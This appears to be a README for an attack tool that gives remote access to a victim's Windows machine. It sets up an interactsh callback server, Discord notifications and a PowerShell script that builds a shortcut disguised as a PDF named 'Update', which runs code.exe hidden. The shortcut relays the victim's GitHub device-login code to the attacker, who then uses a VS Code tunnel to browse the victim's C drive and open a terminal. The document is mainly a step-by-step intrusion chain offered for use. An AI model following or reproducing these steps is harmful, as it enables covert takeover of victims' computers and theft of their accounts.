## Prerequisites

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install golang -y
go install -v github.com/projectdiscovery/notify/cmd/notify@latest
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-server@latest
sudo cp ~/go/bin/* /usr/local/sbin/
```
### Notify Integration
The run.py script contains the option to send notifications to a discord/slack server
To set this up follow the below steps:
1. Setup a discord server with a channel name of your choice, this channel will contain the notifications 
2. Create a webhook within discord by clicking the settings cog on the channel 
3. select 'integrations'
4. create a file at : `$HOME/.config/notify/provider-config.yaml` with the following contents:
```yaml
discord:
  - id: "NAME"
    discord_channel: "CHANNEL-NAME"
    discord_username: "USERNAME OF BOT"
    discord_format: "{{data}}"
    discord_webhook_url: "https://discord.com/api/webhooks/XXXXXXXX"
```
4. Replace the placeholders with your own information, leave the discord_format untouched unless you know what you're doing
5. Done! Notifications will be sent to the discord server

### Github
- Github account required - can just be a burner account 

### DuckDns
- https://www.duckdns.org/
- Sign in with github and follow the steps located under the 'install' menu
- If you have a domain name and wish to use that instead then you just need to point the name servers to your VPS

### Server prefernces
- I used a VPS from oracle cloud, their free tier is truly free but with very limited resources 


## Limitations
https://app.interactsh.com appears to be down quite often and unreiable this method is a bit of a workaround but functions in a similar fashion, instead of having a clean web-interface, github codes are sent through a discord channel. 

## Server setup
```bash
# Run everything in a tmux session so it persists on logout 
tmux new-session -d 'interactsh-server -domain FIXME.DOMAIN.com -skip-acme'
tmux new-session -d 'interactsh-client -s -v FIXME.DOMAIN.com -o output.log'
tmux new-session -d 'python3 run.py'
```
OR
You can use the tmux-setup.sh script to run these steps for you, you just need to change the domain name to match your own

## Creating the payload
#### creator.ps1
On a windows machine, executing the creator.ps1 script will create a shortcut, we will use this to create an attack chain. You can modify the contents of the powershell script as you see fit. 
Here are the defaults:
- Runs the code.exe binary in a hidden window
- Runs the shortcut in a minimized window
- Shortcut name : 'Update'
- Shortcut icon : 'PDF'
- Replace the FIXME-URI with your interactsh CLIENT payload for example:
`c38721878dsj.example.domain.com`

#### Grabbing the github token
This section assumes you have the following actions already completed:
1. interactsh server running 
2. interactsh client running
3. github account created
4. discord integrations setup
5. run.py running 
Once the shortcut is run on the victims machine, it can then be executed. You should shortly see a notification appear in the discord channel with a code. This code can then be passed to:
`https://github.com/login/device/`

#### Interacting with the victim
Now that we have authenticated using the github token, we can navigate to:
`https://vscode.dev/`
1. click on remote explorer 
2. select 'remote' from the dropdown menu and you should see the name of the tunnel you setup 
3. you can then go to `https://vscode.dev/TUNNELNAME/C:` to view the contents of the C drive
4. you can run a terminal window 